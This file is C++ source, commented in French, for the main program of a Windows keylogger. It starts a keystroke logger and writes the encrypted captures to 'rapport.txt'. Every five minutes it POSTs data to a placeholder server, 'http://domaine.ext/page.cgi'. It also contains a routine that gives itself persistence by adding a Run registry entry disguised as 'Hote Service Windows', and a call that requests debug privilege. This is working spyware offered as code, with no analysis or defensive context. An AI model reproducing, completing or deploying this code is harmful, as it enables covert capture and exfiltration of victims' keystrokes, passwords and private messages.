/*!
* \file ExtCrypteur.cpp
* Fichier source de la fonction WinMain().
* Point d'entré du programme.
* \author Xavier Monin
* \date 30/10/2008
*/

#include "UploadeurIE.h"
#include "CtrlUploadeurIE.h"
#include "ExtInformations.h"
#include "ExtCrypteur.h"
#include "KeyLogger.h"
#include "FichierLocal.h"

#include <iostream>
#include <windows.h>

using namespace std;

BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
    ) 
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if ( !LookupPrivilegeValue( 
			NULL,            // lookup privilege on local system
			lpszPrivilege,   // privilege to lookup 
			&luid ) )        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
		return FALSE; 
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if ( !AdjustTokenPrivileges(
		   hToken, 
		   FALSE, 
		   &tp, 
		   sizeof(TOKEN_PRIVILEGES), 
		   (PTOKEN_PRIVILEGES) NULL, 
		   (PDWORD) NULL) )
	{ 
		  printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
		  return FALSE; 
	} 

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		  printf("The token does not have the specified privilege. \n");
		  return FALSE;
	} 

	return TRUE;
}

void DemarrageAvecWindows()
{
	HKEY Retour;

	char lpszBinaryPathName[256]={0};

    GetModuleFileName(NULL, lpszBinaryPathName, sizeof(lpszBinaryPathName));
	
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
				0,KEY_ALL_ACCESS,&Retour)!=0)
	{
		cerr << "ERREUR OUVERTURE";
		return;
	}

	if (RegSetValueEx(Retour, "Hote Service Windows", 0, REG_SZ,
				 (unsigned char*)lpszBinaryPathName, sizeof(lpszBinaryPathName))!=0)
	{
		cerr << "ERREUR CREATION";
	}

	RegCloseKey(Retour);
}

/*!
* \brief Point d'entré du programme.
* \return : 0
*/
//int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
int main(int argc, char *argv[])
{
	SetPrivilege(GetModuleHandleA(NULL), SE_DEBUG_NAME, TRUE); // NE PAS DECOMMENTER. NE FONCTIONNE PAS.

	//DemarrageAvecWindows();

	ExtCrypteur crypteur;

	UploadeurIE ie("http://domaine.ext/page.cgi", METHODE_POST, "element", 20);
	ie.definirExtension(&crypteur);

	FichierLocal fichier("rapport.txt");
	fichier.definirExtension(&crypteur);

	Controleur controleur;
	
	controleur.definirStockage(&fichier);
	//controleur.definirStockage(&ie);

	KeyLogger* keylogger = KeyLogger::instancier();
	keylogger->definirControleur(&controleur);

	keylogger->demarrer();

	while(true)
	{
		Sleep(300000); // 5mn
		ie.envoyerDonneesMaintenant("");
	}

	keylogger->liberer();
	
	return 0;
}
